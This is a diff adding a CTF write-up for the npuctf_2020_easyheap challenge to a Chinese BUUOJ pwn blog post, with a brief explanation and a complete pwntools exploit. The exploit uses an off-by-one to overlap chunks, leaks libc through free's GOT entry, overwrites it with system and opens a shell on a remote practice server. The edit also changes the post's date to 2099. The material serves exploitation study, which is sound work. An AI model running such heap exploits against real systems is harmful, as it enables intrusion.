@@ -1,6 +1,6 @@
 ---
 title: BUUOJ pwn(不定期更新)
-date: 2019-12-12 11:37:00
+date: 2099-12-12 11:37:00
 tags: pwn
 top: 3
 ---
@@ -882,5 +882,76 @@ def exp():
     p.interactive()
 exp()
 ```  
-## 0x24  
-咕咕咕……   
+## 0x24  npuctf_2020_easyheap  
+申请释放0x20的chunk后，再申请回来，就能获得用户内容相邻的两块chunk，保存用户chunk信息的chunk会在上面放在一起  
+然后off by one，形成chunk overlap，伪造存信息的chunk，就能把指针改成free_got，同时伪造的时候把prev_inuse位改成0  
+构造成一个假的被free的chunk，就能leak libc，然后向被改之前的指针对应的chunk写入system  
+就getshell了  
+exp：  
+```python  
+#!/usr/bin/env python
+#coding=utf-8
+from pwn import*
+from LibcSearcher import *
+import sys
+context.log_level = 'debug'
+context.terminal = ['terminator','-x','sh','-c']
+binary = './npuctf_2020_easyheap' 
+local = 0
+if local == 1:
+    p=process(binary)
+else:
+    p=remote("node3.buuoj.cn",28734)
+elf=ELF(binary)
+libc=elf.libc
+def add(size,content):
+    p.recvuntil("choice :")
+    p.sendline("1")
+    p.recvuntil("only) : ")
+    p.sendline(str(size))
+    p.recvuntil("Content:")
+    p.send(content)
+def edit(index,content):
+    p.recvuntil("choice :")
+    p.sendline("2")
+    p.recvuntil("Index :")
+    p.sendline(str(index))
+    p.recvuntil("Content: ")
+    p.send(content)
+def show(index):
+    p.recvuntil("choice :")
+    p.sendline("3")
+    p.recvuntil("Index :")
+    p.sendline(str(index))
+def free(index):
+    p.recvuntil("choice :")
+    p.sendline("4")
+    p.recvuntil("Index :")
+    p.sendline(str(index))
+def exp():
+    add(24,"aaaa") # 0
+    free(0)
+    add(56,"bbbb") # 0
+    add(24,"cccc") # 1
+    add(24,"2222") # 2
+    add(24,"3333") # 3
+    payload = "a"*0x38 + p8(0x41)
+    edit(0,payload)
+    free(1)
+    add(56,"fuck") # 1
+    payload = "a"*0x10 + p64(0) + p64(0x20) + p64(0x18) + p64(elf.got['free'])
+    edit(1,payload)
+    show(2)
+    free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+    log.success("free_addr==>" + hex(free_addr))
+    libc_base = free_addr - libc.sym['free']
+    log.success("libc_base==>" + hex(libc_base))
+    system = libc_base + libc.sym['system']
+    edit(2,p64(system))
+    add(24,"/bin/sh") # 4
+    free(4)
+    p.interactive()
+exp()
+```  
+## 0x25  
+咕咕咕……  
